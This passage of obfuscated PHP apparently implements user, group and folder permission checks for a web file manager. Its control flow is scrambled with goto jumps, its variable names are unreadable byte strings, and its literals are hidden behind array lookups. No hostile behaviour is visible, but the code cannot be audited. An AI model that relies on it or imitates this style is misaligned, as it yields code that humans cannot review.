* 2; } if ($FŒÓ«šíÓƒ[$dùåáØì±¡[413]] == SourceModel::TYPE_USER) { $e¨çßœ‘Ûî = $f“õÈ•Æ½‘; } goto A‘èˆè˜óŸ; A‘èˆè˜óŸ: if ($FŒÓ«šíÓƒ[$dùåáØì±¡[413]] == SourceModel::TYPE_USER && $FŒÓ«šíÓƒ[$dùåáØì±¡[493]] == $dùåáØì±¡[201]) { $e¨çßœ‘Ûî = 0; } $dÚóÂ‚åñ[] = $fœÑØµ‰¾å[$dùåáØì±¡[415]] + $e¨çßœ‘Ûî; goto B„¶ÅŒÆè; EÄ²¾·ƒ•é: if (!$dÁ Ş¼…½) { continue; } $dÁ Ş¼…½[$dùåáØì±¡[455]] = $fœÑØµ‰¾å; $F’¿™Š¶½[] = $dÁ Ş¼…½; goto B„ã™ËÖÌá; B„¶ÅŒÆè: } array_multisort($dÚóÂ‚åñ, SORT_DESC, $F’¿™Š¶½); goto dÃÑÑ½– œ; bŠ³¥’³Û¶: $dùåáØì±¡ =& $_SERVER[Ü˜]; $F’¿™Š¶½ = array(); $dÚóÂ‚åñ = array(); goto C¼ˆÂÍ­íä; cÒÜïˆ¥Å‹: } public function getAllChildrenByUser($CÊŸâ•óÑ¹, $aòÙ˜Ÿ®Ş½) { goto C†ğä¹¿‘×; aÙ„‹†Ğ¹: foreach ($e¹„êå–ò as $EÁ‚ÀÙ »²) { $Bª¸´´æé = !1; foreach ($EÁ‚ÀÙ »²[$e°âÆ¬ğ´…[1864]] as $EÍÆÀ©–˜) { if ($EÍÆÀ©–˜[$e°âÆ¬ğ´…[1529]]) { if ($EÍÆÀ©–˜[$e°âÆ¬ğ´…[1529]] == $aòÙ˜Ÿ®Ş½) { $Bª¸´´æé = !0; break; } } if ($EÍÆÀ©–˜[$e°âÆ¬ğ´…[1693]]) { if ($this->groupContainUser($EÍÆÀ©–˜[$e°âÆ¬ğ´…[1693]], $aòÙ˜Ÿ®Ş½)) { $Bª¸´´æé = !0; break; } } } if ($Bª¸´´æé) { $Fêëâ·‰²Ó[] = $EÁ‚ÀÙ »²; } $F‹ßÛ¯çµŞ = $EÁ‚ÀÙ »²[$e°âÆ¬ğ´…[404]]; if (isset($b³ñëğ†‰[$F‹ßÛ¯çµŞ])) { $EÁ‚ÀÙ »²[$e°âÆ¬ğ´…[1864]][] = $b³ñëğ†‰[$F‹ßÛ¯çµŞ][0]; $b³ñëğ†‰[$F‹ßÛ¯çµŞ] = !1; } } $b³ñëğ†‰ = array_filter(array_values($b³ñëğ†‰)); $Fêëâ·‰²Ó = array_merge($b³ñëğ†‰, $Fêëâ·‰²Ó); goto D½ÛÊ²ÔÄ; C†ğä¹¿‘×: $e°âÆ¬ğ´… =& $_SERVER[Ü˜]; $aŒ¬ØÔìÜ» = Model($e°âÆ¬ğ´…[515])->getInfo($aòÙ˜Ÿ®Ş½); if (!$aòÙ˜Ÿ®Ş½ || !$CÊŸâ•óÑ¹ || !$aŒ¬ØÔìÜ») { return array(); } goto b¨É•Â½³; E±½¦ñ·: if ($Fâ¦ğª›¶È[$e°âÆ¬ğ´…[487]] == $e°âÆ¬ğ´…[201] && $Fâ¦ğª›¶È[$e°âÆ¬ğ´…[493]] != $Fµ±‡‡—øâ && $this->groupContainUser($Fâ¦ğª›¶È[$e°âÆ¬ğ´…[493]], $aòÙ˜Ÿ®Ş½)) { foreach ($aŒ¬ØÔìÜ»[$e°âÆ¬ğ´…[1867]] as $FÑÒàé­Ú) { $D…¼šİÒÑ = Model($e°âÆ¬ğ´…[495])->getInfo($FÑÒàé­Ú[$e°âÆ¬ğ´…[1693]]); $cåËÏ÷­§¨ = Model($e°âÆ¬ğ´…[515])->getInfoSimpleOuter($aòÙ˜Ÿ®Ş½); $cåËÏ÷­§¨[$e°âÆ¬ğ´…[455]] = $FÑÒàé­Ú[$e°âÆ¬ğ´…[415]]; if (Model($e°âÆ¬ğ´…[1860])->authCheckAction($FÑÒàé­Ú[$e°âÆ¬ğ´…[415]][$e°âÆ¬ğ´…[415]], $e°âÆ¬ğ´…[1713])) { continue; } $D‘î¡ãø§Ç = array($e°âÆ¬ğ´…[28] => $e°âÆ¬ğ´…[1482] . $D…¼šİÒÑ[$e°âÆ¬ğ´…[28]], $e°âÆ¬ğ´…[404] => $D…¼šİÒÑ[$e°âÆ¬ğ´…[95]][$e°âÆ¬ğ´…[404]], $e°âÆ¬ğ´…[86] => KodIO::make($D…¼šİÒÑ[$e°âÆ¬ğ´…[95]][$e°âÆ¬ğ´…[404]]), $e°âÆ¬ğ´…[487] => $e°âÆ¬ğ´…[201], $e°âÆ¬ğ´…[413] => $e°âÆ¬ğ´…[1016], $e°âÆ¬ğ´…[29] => $e°âÆ¬ğ´…[526], $e°âÆ¬ğ´…[504] => $D…¼šİÒÑ[$e°âÆ¬ğ´…[500]], $e°âÆ¬ğ´…[1693] => $D…¼šİÒÑ[$e°âÆ¬ğ´…[1693]], $e°âÆ¬ğ´…[497] => $D…¼šİÒÑ[$e°âÆ¬ğ´…[487]], $e°âÆ¬ğ´…[1864] => array($cåËÏ÷­§¨)); $b³ñëğ†‰[$D‘î¡ãø§Ç[$e°âÆ¬ğ´…[404]]] = $D‘î¡ãø§Ç; } } $Fêëâ·‰²Ó = array(); $e¹„êå–ò = $this->getAllChildren($CÊŸâ•óÑ¹); goto aÙ„‹†Ğ¹; b¨É•Â½³: $Fâ¦ğª›¶È = Model($e°âÆ¬ğ´…[1207])->sourceInfo($CÊŸâ•óÑ¹); $b³ñëğ†‰ = array(); $Fµ±‡‡—øâ = 1; goto E±½¦ñ·; D½ÛÊ²ÔÄ: return $Fêëâ·‰²Ó; goto B¡¥½¹‡‰°; B¡¥½¹‡‰°: } public function setAllChildrenByUser($e‘ö–„ÃğÉ, $Eòéé†Şòà, $fØÌù¿ÉÛ™) { $Dè¿”‹˜© =& $_SERVER[Ü˜]; $cĞùÎŸà‰à = $this->getAllChildrenByUser($e‘ö–„ÃğÉ, $Eòéé†Şòà); if (!$fØÌù¿ÉÛ™ || !$cĞùÎŸà‰à) { return !1; } foreach ($cĞùÎŸà‰à as $c©çóÜÅµï) { $eƒš´à‡ñğ = array(); foreach ($c©çóÜÅµï[$Dè¿”‹˜©[1864]] as $B²ƒ³œ‚ó’) { $C°àÉ×½¡© = $B²ƒ³œ‚ó’[$Dè¿”‹˜©[455]]; $c½ÔàÉå‚„ = $B²ƒ³œ‚ó’[$Dè¿”‹˜©[1529]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $d„šƒİ©éš = $B²ƒ³œ‚ó’[$Dè¿”‹˜©[1529]] ? $B²ƒ³œ‚ó’[$Dè¿”‹˜©[1529]] : $B²ƒ³œ‚ó’[$Dè¿”‹˜©[1693]]; if ($B²ƒ³œ‚ó’[$Dè¿”‹˜©[1529]] && $B²ƒ³œ‚ó’[$Dè¿”‹˜©[1529]] == $Eòéé†Şòà) { continue; } $eƒš´à‡ñğ[] = array($Dè¿”‹˜©[404] => $c©çóÜÅµï[$Dè¿”‹˜©[404]], $Dè¿”‹˜©[413] => $c½ÔàÉå‚„, $Dè¿”‹˜©[493] => intval($d„šƒİ©éš), $Dè¿”‹˜©[1788] => isset($C°àÉ×½¡©[$Dè¿”‹˜©[402]]) ? intval($C°àÉ×½¡©[$Dè¿”‹˜©[402]]) : 0, $Dè¿”‹˜©[1842] => isset($C°àÉ×½¡©[$Dè¿”‹˜©[1842]]) ? intval($C°àÉ×½¡©[$Dè¿”‹˜©[1842]]) : -1); } $eƒš´à‡ñğ[] = array($Dè¿”‹˜©[404] => $c©çóÜÅµï[$Dè¿”‹˜©[404]], $Dè¿”‹˜©[413] => SourceModel::TYPE_USER, $Dè¿”‹˜©[493] => intval($Eòéé†Şòà), $Dè¿”‹˜©[1788] => intval($fØÌù¿ÉÛ™), $Dè¿”‹˜©[1842] => -1); $this->where(array($Dè¿”‹˜©[419] => $c©çóÜÅµï[$Dè¿”‹˜©[404]]))->delete(); $this->addAll($eƒš´à‡ñğ); } return !0; } public function get($f†ƒ÷øÔ¸…) { $D¢Óé“Ú…Ì = $this->getSourceList(array($f†ƒ÷øÔ¸…), !0); return $D¢Óé“Ú…Ì[0]; } public function getSourceList($dóËø£øšµ, $a†Ëõ’©– = false, $b£ùæçŸ‹¾ = false) { goto bâ¹´Í½²ù; A™‘î…ñŠƒ: if (!$a†Ëõ’©– && count($dóËø£øšµ) == 1) { $a†Ëõ’©– = array(); $a†Ëõ’©–[$dóËø£øšµ[0]] = $E„±Î÷½éÆ->sourceInfo($dóËø£øšµ[0]); } if (!$a†Ëõ’©–) { $Ešˆ´™Ú = array($eäÌÁ¤ˆÖ[419] => array($eäÌÁ¤ˆÖ[420], $dóËø£øšµ)); $a†Ëõ’©– = $E„±Î÷½éÆ->field($eäÌÁ¤ˆÖ[1868])->where($Ešˆ´™Ú)->select(); $a†Ëõ’©– = array_to_keyvalue($a†Ëõ’©–, $eäÌÁ¤ˆÖ[404]); } $aá™ ö¡Ø½ = $dóËø£øšµ; goto cÃ©Œóá›å; b·µ·¥äôÄ: $a¨â¢É¨Çñ = $this->userIsRoot($b£ùæçŸ‹¾); $DÌ¬–‹Êö = AuthModel::authAll(); $EŸ½ò´Ôª = array($eäÌÁ¤ˆÖ[416] => $DÌ¬–‹Êö, $eäÌÁ¤ˆÖ[1869] => array($eäÌÁ¤ˆÖ[421] => 0, $eäÌÁ¤ˆÖ[1699] => $DÌ¬–‹Êö, $eäÌÁ¤ˆÖ[422] => LNG($eäÌÁ¤ˆÖ[1870]), $eäÌÁ¤ˆÖ[1714] => $eäÌÁ¤ˆÖ[1871])); goto E‰®à¡µ†Š; bâ¹´Í½²ù: $eäÌÁ¤ˆÖ =& $_SERVER[Ü˜]; if (!$dóËø£øšµ) { return array(); } $E„±Î÷½éÆ = Model($eäÌÁ¤ˆÖ[1207]); goto A™‘î…ñŠƒ; a†æñøˆÆ: $DÙŒ¬ØÄà = $this->sourceAuthSelect($aá™ ö¡Ø½); $b™£®©‚Ş = array(); foreach ($aá™ ö¡Ø½ as $D¢óÊÙ„Ú) { if (isset($DÙŒ¬ØÄà[$D¢óÊÙ„Ú])) { $b™£®©‚Ş[$D¢óÊÙ„Ú] = $DÙŒ¬ØÄà[$D¢óÊÙ„Ú]; } } goto b·µ·¥äôÄ; cÃ©Œóá›å: foreach ($a†Ëõ’©– as $cßí¦¬™¸ => $EÈğˆÛçÈá) { $ešàñ‰¬ä = $E„±Î÷½éÆ->parentLevelArray($EÈğˆÛçÈá[$eäÌÁ¤ˆÖ[496]]); $aá™ ö¡Ø½ = array_merge($aá™ ö¡Ø½, array($cßí¦¬™¸), array_reverse($ešàñ‰¬ä)); } $aá™ ö¡Ø½ = array_values(array_unique($aá™ ö¡Ø½)); if (!$aá™ ö¡Ø½) { return array(); } goto a†æñøˆÆ; E‰®à¡µ†Š: $bÖ÷÷Ñ­ÉÖ = array(); foreach ($a†Ëõ’©– as $D¢óÊÙ„Ú => $b‹œ°Ó‰ø) { if ($a¨â¢É¨Çñ) { $bÖ÷÷Ñ­ÉÖ[$D¢óÊÙ„Ú] = $EŸ½ò´Ôª; continue; } $bÖ÷÷Ñ­ÉÖ[$D¢óÊÙ„Ú] = $this->makeSourceAuth($b‹œ°Ó‰ø, $b™£®©‚Ş, $b£ùæçŸ‹¾); } return $bÖ÷÷Ñ­ÉÖ; goto dÔó¯çˆŒ; dÔó¯çˆŒ: } public function authDeepCheck($C¬êìÜ‰à, $FŸòˆœÉ = false) { goto fí¹ïàôŸ¨; fí¹ïàôŸ¨: $eÄˆÇ…»Âò =& $_SERVER[Ü˜]; $FŸòˆœÉ = $FŸòˆœÉ ? $FŸòˆœÉ : USER_ID; $EöÁŸõÒè = $this->makeAuthDeep($FŸòˆœÉ); goto aÙ«İ†ß¯ë; aÙ«İ†ß¯ë: if (!in_array($C¬êìÜ‰à, $EöÁŸõÒè[$eÄˆÇ…»Âò[1872]])) { return !1; } $díÊ˜ÖĞ¹® = array(); foreach ($EöÁŸõÒè[$eÄˆÇ…»Âò[1873]] as $DÔÈà‹Ø•é => $c‹›°àˆİƒ) { if (!in_array($C¬êìÜ‰à, $c‹›°àˆİƒ)) { continue; } $díÊ˜ÖĞ¹®[] = $DÔÈà‹Ø•é; } goto DŞ¤ÈëÈÎ§; DŞ¤ÈëÈÎ§: if (!$díÊ˜ÖĞ¹®) { return !1; } $AĞ§­Üï…Î = $díÊ˜ÖĞ¹® ? $díÊ˜ÖĞ¹®[0] : $C¬êìÜ‰à; return array($eÄˆÇ…»Âò[416] => -1, $eÄˆÇ…»Âò[455] => array($eÄˆÇ…»Âò[421] => $eÄˆÇ…»Âò[1086], $eÄˆÇ…»Âò[1699] => $eÄˆÇ…»Âò[201], $eÄˆÇ…»Âò[422] => LNG($eÄˆÇ…»Âò[1874]), $eÄˆÇ…»Âò[1714] => $eÄˆÇ…»Âò[1875]), $eÄˆÇ…»Âò[1876] => LNG($eÄˆÇ…»Âò[1877]), $eÄˆÇ…»Âò[1878] => $this->sourceAuthInfo($AĞ§­Üï…Î)); goto dë´§ÇÚêÛ; dë´§ÇÚêÛ: } protected function makeAuthDeep($d´¶ôàÑ° = false) { goto AÑŠ”ëÈå—; bŞä«Ñ“½: foreach ($E©É‘…ËÀ¨ as $E»ó»¯š°) { if ($E»ó»¯š°[$a¸¢ê³Â[415]] == 0 && $E»ó»¯š°[$a¸¢ê³Â[1715]] == $a¸¢ê³Â[97]) { $b‡ß¬ƒëƒÖ[] = $E»ó»¯š°[$a¸¢ê³Â[402]]; } } $fŒ£…í‘È = $this->userGroupParents($d´¶ôàÑ°); $CÄÏêáÇ´ = array($a¸¢ê³Â[413] => SourceModel::TYPE_USER, $a¸¢ê³Â[493] => $d´¶ôàÑ°); goto d¨ĞÁ£ÈĞã; a‹ñéè…†Ü: $dÅ¿×áÄÀ = $cÍ«ªš­ˆ÷; foreach ($dÅ¿×áÄÀ as $BíøÙŠòèÉ) { $a—šÌ® = $bß½µŒÄË¾->getInfo($BíøÙŠòèÉ); $eÖ†æ‚ªÕ± = $a„ò¿ÛŠƒ´->parentLevelArray($a—šÌ®[$a¸¢ê³Â[496]]); $cÍ«ªš­ˆ÷ = array_merge($cÍ«ªš­ˆ÷, $eÖ†æ‚ªÕ±); } $cÍ«ªš­ˆ÷ = array_values(array_unique($cÍ«ªš­ˆ÷)); goto Cá’½ÔÎÍÏ; fÙÆ–ÔÑ¢±: $a˜à•¦ÕÇ = array(); if ($f·‘ä­Ş‡™) { $C¾‡Ñä•¼ğ = $a„ò¿ÛŠƒ´->where(array($a¸¢ê³Â[404] => array($a¸¢ê³Â[420], $f·‘ä­Ş‡™)))->select(); foreach ($C¾‡Ñä•¼ğ as $F¼–”Ï“å¨) { $eÖ†æ‚ªÕ± = $a„ò¿ÛŠƒ´->parentLevelArray($F¼–”Ï“å¨[$a¸¢ê³Â[496]]); $E®ŠšÍÄº‚ = array_merge($E®ŠšÍÄº‚, $eÖ†æ‚ªÕ±); $cÍ«ªš­ˆ÷[] = $F¼–”Ï“å¨[$a¸¢ê³Â[493]]; $F¹„í—Õ†§[$F¼–”Ï“å¨[$a¸¢ê³Â[404]]] = $eÖ†æ‚ªÕ±; $bô¹‰ ´á’[$F¼–”Ï“å¨[$a¸¢ê³Â[404]]] = $F¼–”Ï“å¨[$a¸¢ê³Â[493]]; } } $cÍ«ªš­ˆ÷ = array_values(array_unique($cÍ«ªš­ˆ÷)); goto a‹ñéè…†Ü; AáóÆ”„»: if (isset($fİ¥¿Ã‡Â‰[$d´¶ôàÑ°])) { return $fİ¥¿Ã‡Â‰[$d´¶ôàÑ°]; } $E©É‘…ËÀ¨ = Model($a¸¢ê³Â[1879])->listData(); $b‡ß¬ƒëƒÖ = array(); goto bŞä«Ñ“½; d¨ĞÁ£ÈĞã: if ($fŒ£…í‘È) { $CÄÏêáÇ´ = array(array($a¸¢ê³Â[413] => SourceModel::TYPE_USER, $a¸¢ê³Â[493] => $d´¶ôàÑ°), array($a¸¢ê³Â[413] => SourceModel::TYPE_GROUP, $a¸¢ê³Â[493] => array($a¸¢ê³Â[420], $fŒ£…í‘È)), $a¸¢ê³Â[958] => $a¸¢ê³Â[1780]); } $B³‘§­¹¸• = $this->field($a¸¢ê³Â[1880])->where($CÄÏêáÇ´)->select(); $f·‘ä­Ş‡™ = array(); goto aßõÙ±ÌÍå; CÖ¸íÀ…£¯: $cÍ«ªš­ˆ÷ = $fŒ£…í‘È; $a„ò¿ÛŠƒ´ = Model($a¸¢ê³Â[1207]); $bß½µŒÄË¾ = Model($a¸¢ê³Â[495]); goto E‘¼İ¡æÖœ; E‘¼İ¡æÖœ: $F¹„í—Õ†§ = array(); $bô¹‰ ´á’ = array(); $b–‡–—ê = array(); goto fÙÆ–ÔÑ¢±; AÑŠ”ëÈå—: $a¸¢ê³Â =& $_SERVER[Ü˜]; static $fİ¥¿Ã‡Â‰ = array(); $d´¶ôàÑ° = $d´¶ôàÑ° ? $d´¶ôàÑ° : USER_ID; goto AáóÆ”„»; Cá’½ÔÎÍÏ: foreach ($cÍ«ªš­ˆ÷ as $BíøÙŠòèÉ) { $a—šÌ® = $bß½µŒÄË¾->getInfo($BíøÙŠòèÉ); $E®ŠšÍÄº‚[] = $a—šÌ®[$a¸¢ê³Â[95]][$a¸¢ê³Â[404]]; $b–‡–—ê[$BíøÙŠòèÉ] = $a—šÌ®[$a¸¢ê³Â[95]][$a¸¢ê³Â[404]]; $a˜à•¦ÕÇ[$BíøÙŠòèÉ] = $a„ò¿ÛŠƒ´->parentLevelArray($a—šÌ®[$a¸¢ê³Â[496]]); } foreach ($F¹„í—Õ†§ as $A¬õˆ˜ÙÏ£ => $D‚ŞØÓ£¬Ù) { $AÅÎÕ¸å†„ = $bô¹‰ ´á’[$A¬õˆ˜ÙÏ£]; if (!$AÅÎÕ¸å†„ || !$b–‡–—ê[$AÅÎÕ¸å†„]) { continue; } $A»³Ó“¾ = array(); foreach ($a˜à•¦ÕÇ[$AÅÎÕ¸å†„] as $BíøÙŠòèÉ) { $A»³Ó“¾[] = $b–‡–—ê[$BíøÙŠòèÉ]; } $F¹„í—Õ†§[$A¬õˆ˜ÙÏ£] = array_merge($A»³Ó“¾, $D‚ŞØÓ£¬Ù); } $E®ŠšÍÄº‚ = array_values(array_unique($E®ŠšÍÄº‚)); goto dïÏ‚—óÌ¿; dïÏ‚—óÌ¿: $f»×éèŠ•ù = array($a¸¢ê³Â[1872] => $E®ŠšÍÄº‚, $a¸¢ê³Â[1873] => $F¹„í—Õ†§); $fİ¥¿Ã‡Â‰[$d´¶ôàÑ°] = $f»×éèŠ•ù; return $f»×éèŠ•ù; goto EŒ½İ·”Û‚; aßõÙ±ÌÍå: $aÓ¡áŒâê = array_to_keyvalue_group($B³‘§­¹¸•, $a¸¢ê³Â[404]); foreach ($aÓ¡áŒâê as $d„’´Æö¼ô => $E§Ó•ô§–) { $FŠÔªÚãõ = $this->authArrayCheck($E§Ó•ô§–, $d´¶ôàÑ°); if ($FŠÔªÚãõ[$a¸¢ê³Â[416]] > 0) { $f·‘ä­Ş‡™[] = $d„’´Æö¼ô . $a¸¢ê³Â[33]; } } $E®ŠšÍÄº‚ = array(); goto CÖ¸íÀ…£¯; EŒ½İ·”Û‚: } private function makeSourceAuth($C¥¼½ã…Ç‰, $e©œäÆ±Œ, $eÎ°š÷¸— = false) { goto BÂ‹¨¤˜Ìá; a…Š³¥‹ö: foreach ($dÆ–ä³ê as $EÎÔö™˜Ó) { if (!isset($e©œäÆ±Œ[$EÎÔö™˜Ó])) { continue; } $d³­“™Á„Å = $this->authMake($e©œäÆ±Œ[$EÎÔö™˜Ó], $eÎ°š÷¸—); if ($d³­“™Á„Å[$Bù¨Üµ»£¢[455]]) { $fÛ¶ôÊ“Š = $d³­“™Á„Å; break; } } if (!$Aš²Šï¿±) { return $fÛ¶ôÊ“Š; } if (!$fÛ¶ôÊ“Š && $Eù‰éß½è) { $fÛ¶ôÊ“Š = $this->groupAuthInfo($Eù‰éß½è, $Bà§óâéíÙ); } goto CøóË‰Úªƒ; BÂ‹¨¤˜Ìá: $Bù¨Üµ»£¢ =& $_SERVER[Ü˜]; $b‡šğƒÀŠ = $Bù¨Üµ»£¢[97]; $Bà§óâéíÙ = $C¥¼½ã…Ç‰[$Bù¨Üµ»£¢[493]]; goto cìÊ³³ÑáÂ; CøóË‰Úªƒ: if (!$fÛ¶ôÊ“Š) { $eëÍÅÛ‹ˆ“ = Model($Bù¨Üµ»£¢[495])->getInfo($Bà§óâéíÙ); $Dí¢‹‰ÓÃœ = explode($Bù¨Üµ»£¢[47], trim($eëÍÅÛ‹ˆ“[$Bù¨Üµ»£¢[496]], $Bù¨Üµ»£¢[47])); $Dí¢‹‰ÓÃœ = array_reverse($Dí¢‹‰ÓÃœ); foreach ($Dí¢‹‰ÓÃœ as $b¼šß¦™) { if ($b¼šß¦™ == $Bù¨Üµ»£¢[201] || $b¼šß¦™ == $b‡šğƒÀŠ) { continue; } $CæÈŠ¸™½‡ = $this->groupRootAuth($b¼šß¦™, $eÎ°š÷¸—); if (!$CæÈŠ¸™½‡) { continue; } $fÛ¶ôÊ“Š = $this->groupAuthInfo($CæÈŠ¸™½‡, $b¼šß¦™); break; } } if (!$fÛ¶ôÊ“Š || $fÛ¶ôÊ“Š[$Bù¨Üµ»£¢[416]] <= 0) { $b‹è¾Ç“ºÊ = $this->authDeepCheck($C¥¼½ã…Ç‰[$Bù¨Üµ»£¢[404]], $eÎ°š÷¸—); if ($b‹è¾Ç“ºÊ) { $fÛ¶ôÊ“Š = $b‹è¾Ç“ºÊ; } } return $fÛ¶ôÊ“Š; goto eÒ–Ê‰ªÌ¬; f½ Š†‡á: $dÆ–ä³ê = Model($Bù¨Üµ»£¢[1207])->parentLevelArray($C¥¼½ã…Ç‰[$Bù¨Üµ»£¢[496]]); $dÆ–ä³ê = array_merge(array($C¥¼½ã…Ç‰[$Bù¨Üµ»£¢[404]]), array_reverse($dÆ–ä³ê)); $fÛ¶ôÊ“Š = !1; goto a…Š³¥‹ö; cìÊ³³ÑáÂ: $Aš²Šï¿± = $C¥¼½ã…Ç‰[$Bù¨Üµ»£¢[413]] == SourceModel::TYPE_GROUP; $Eù‰éß½è = $Aš²Šï¿± ? $this->groupRootAuth($Bà§óâéíÙ, $eÎ°š÷¸—) : !1; if ($Eù‰éß½è && Model($Bù¨Üµ»£¢[1860])->authCheckAction($Eù‰éß½è[$Bù¨Üµ»£¢[415]], $Bù¨Üµ»£¢[1713])) { return $this->groupAuthInfo($Eù‰éß½è, $Bà§óâéíÙ); } goto f½ Š†‡á; eÒ–Ê‰ªÌ¬: } private function userIsRoot($c‰İèå¶‘ = false) { $aÛë†ˆŠ =& $_SERVER[Ü˜]; if (!$c‰İèå¶‘ && _get($GLOBALS, $aÛë†ˆŠ[494])) { return !0; } $e£ëæÁëùÌ = Model($aÛë†ˆŠ[515])->getInfo($c‰İèå¶‘); $a—†¬„À½Á = Model($aÛë†ˆŠ[1881])->listData($e£ëæÁëùÌ[$aÛë†ˆŠ[1414]]); if ($a—†¬„À½Á && $a—†¬„À½Á[$aÛë†ˆŠ[1284]][$aÛë†ˆŠ[1882]] == 1) { return !0; } return !1; } private function sourceAuthInfo($e¯’é¹ÀÀ) { goto cÅ±ĞÏ±Ö; bÕ‰»­Ù¿î: if (isset($D™ªë¶Ú‘õ[$CĞÛœñ“Øí[501]])) { $B¢¨Ïßçãó = explode($CĞÛœñ“Øí[8], trim($D™ªë¶Ú‘õ[$CĞÛœñ“Øí[504]], $CĞÛœñ“Øí[8])); array_shift($B¢¨Ïßçãó); $D°ŸÓ¬Â– = $D™ªë¶Ú‘õ[$CĞÛœñ“Øí[499]] . $CĞÛœñ“Øí[1883] . implode($CĞÛœñ“Øí[8], $B¢¨Ïßçãó); } return array($CĞÛœñ“Øí[422] => $D™ªë¶Ú‘õ[$CĞÛœñ“Øí[28]], $CĞÛœñ“Øí[86] => KodIO::make($D™ªë¶Ú‘õ[$CĞÛœñ“Øí[404]]), $CĞÛœñ“Øí[1884] => $D°ŸÓ¬Â–); goto B˜Àå«µÈÓ; C¹‡™‚Èô–: if (!$D™ªë¶Ú‘õ) { return !1; } $F»›­Óì->groupPathDisplay($D™ªë¶Ú‘õ); $E¾’ëˆÇ…Î = array($D™ªë¶Ú‘õ); goto b´¥¦âÜî; b´¥¦âÜî: $E¾’ëˆÇ…Î = $F»›­Óì->_listAppendPath($E¾’ëˆÇ…Î); $D™ªë¶Ú‘õ = $E¾’ëˆÇ…Î[0]; $D°ŸÓ¬Â– = $D™ªë¶Ú‘õ[$CĞÛœñ“Øí[504]]; goto bÕ‰»­Ù¿î; cÅ±ĞÏ±Ö: $CĞÛœñ“Øí =& $_SERVER[Ü˜]; $F»›­Óì = Model($CĞÛœñ“Øí[1207]); $D™ªë¶Ú‘õ = $F»›­Óì->sourceInfo($e¯’é¹ÀÀ); goto C¹‡™‚Èô–; B˜Àå«µÈÓ: } private function groupAuthInfo($eÏà¬ŸèÃó, $EïÏÖ„Õ™¨) { $C§ÌĞé‘Ó› =& $_SERVER[Ü˜]; $Aš¾ñ˜‘¤ = Model($C§ÌĞé‘Ó›[495])->getInfo($EïÏÖ„Õ™¨); return array($C§ÌĞé‘Ó›[1885] => intval($eÏà¬ŸèÃó[$C§ÌĞé‘Ó›[415]]), $C§ÌĞé‘Ó›[1869] => $eÏà¬ŸèÃó, $C§ÌĞé‘Ó›[1886] => LNG($C§ÌĞé‘Ó›[1887]), $C§ÌĞé‘Ó›[1878] => array($C§ÌĞé‘Ó›[422] => $Aš¾ñ˜‘¤[$C§ÌĞé‘Ó›[28]], $C§ÌĞé‘Ó›[86] => KodIO::make($Aš¾ñ˜‘¤[$C§ÌĞé‘Ó›[95]][$C§ÌĞé‘Ó›[404]]), $C§ÌĞé‘Ó›[1884] => $Aš¾ñ˜‘¤[$C§ÌĞé‘Ó›[500]])); } protected function groupRootAuth($dÜéø‰ÍÊ‘, $bóõèÄ¡Å¯ = false) { goto e²¥åˆ’İ•; A¦‡¶‘£Âê: $a—×àî„·[$fàõŸºƒà] = $fµ–ë‰˜ ? $fµ–ë‰˜ : $CÖ¶©ÀŸÅ; return $a—×àî„·[$fàõŸºƒà]; goto d”‰‰’‹›¡; e´–µ¾šŞ: $cñŠÖ« ù = $this->userGroupList($bóõèÄ¡Å¯); $CÖ¶©ÀŸÅ = isset($cñŠÖ« ù[$dÜéø‰ÍÊ‘]) ? $cñŠÖ« ù[$dÜéø‰ÍÊ‘][$EåÒ—á²Ê„[415]] : !1; if ($CÖ¶©ÀŸÅ && Model($EåÒ—á²Ê„[1860])->authCheckAction($CÖ¶©ÀŸÅ[$EåÒ—á²Ê„[415]], $EåÒ—á²Ê„[1713])) { $a—×àî„·[$fàõŸºƒà] = $CÖ¶©ÀŸÅ; return $CÖ¶©ÀŸÅ; } goto cÛÒ”»Ú²È; CÀĞÎ›ÈÍæ: static $a—×àî„· = array(); if (isset($a—×àî„·[$fàõŸºƒà])) { return $a—×àî„·[$fàõŸºƒà]; } $BÔ‡Î‹œ†¯ = Model($EåÒ—á²Ê„[495])->getInfo($dÜéø‰ÍÊ‘); goto e´–µ¾šŞ; e²¥åˆ’İ•: $EåÒ—á²Ê„ =& $_SERVER[Ü˜]; $bóõèÄ¡Å¯ = $bóõèÄ¡Å¯ ? $bóõèÄ¡Å¯ : USER_ID; $fàõŸºƒà = $bóõèÄ¡Å¯ . $EåÒ—á²Ê„[1888] . $dÜéø‰ÍÊ‘; goto CÀĞÎ›ÈÍæ; cÛÒ”»Ú²È: $fòˆ×çõïƒ = $this->sourceAuthSelect($BÔ‡Î‹œ†¯[$EåÒ—á²Ê„[95]][$EåÒ—á²Ê„[404]]); $bÇíĞÛ¨Œƒ = $fòˆ×çõïƒ ? $this->authMake($fòˆ×çõïƒ, $bóõèÄ¡Å¯) : !1; $fµ–ë‰˜ = $bÇíĞÛ¨Œƒ ? $bÇíĞÛ¨Œƒ[$EåÒ—á²Ê„[455]] : !1; goto A¦‡¶‘£Âê; d”‰‰’‹›¡: } public function authOwnerApply($cÂÁ„Ÿççˆ) { goto E¾Û·§äÎ‡; eÉâ¶Ê„—: $cÂÁ„Ÿççˆ[$DÒŠÄ¢‚ä¹[415]][$DÒŠÄ¢‚ä¹[1891]] = Model($DÒŠÄ¢‚ä¹[511])->userListInfo($Dã„—éãæÜ); return $cÂÁ„Ÿççˆ; goto aí¡Ô¿©ïÀ; BÈ·¿óŒ²§: if (count($Dã„—éãæÜ) == 0) { $Dã„—éãæÜ = $this->authFolderOwnerGroup($cÂÁ„Ÿççˆ[$DÒŠÄ¢‚ä¹[493]]); } $Dã„—éãæÜ = array_unique($Dã„—éãæÜ); if (AuthModel::authCheckRoot($cÂÁ„Ÿççˆ[$DÒŠÄ¢‚ä¹[415]][$DÒŠÄ¢‚ä¹[416]])) { $Dã„—éãæÜ[] = USER_ID; } goto eÉâ¶Ê„—; aø¯Š‡¢Ü: $b¿Ûî‚Ú¥ù = array(); $Dã„—éãæÜ = array(); foreach ($cîÂ Òé as $bâä®ë•¦“ => $b›°ß¼‹®) { $F×´ë…ÀóÃ = $this->authFolderOwnerUser($b›°ß¼‹®); $b¿Ûî‚Ú¥ù[$bâä®ë•¦“] = $F×´ë…ÀóÃ; $Dã„—éãæÜ = array_merge($Dã„—éãæÜ, $F×´ë…ÀóÃ[$DÒŠÄ¢‚ä¹[571]]); if ($F×´ë…ÀóÃ[$DÒŠÄ¢‚ä¹[1890]]) { break; } } goto BÈ·¿óŒ²§; E¾Û·§äÎ‡: $DÒŠÄ¢‚ä¹ =& $_SERVER[Ü˜]; if 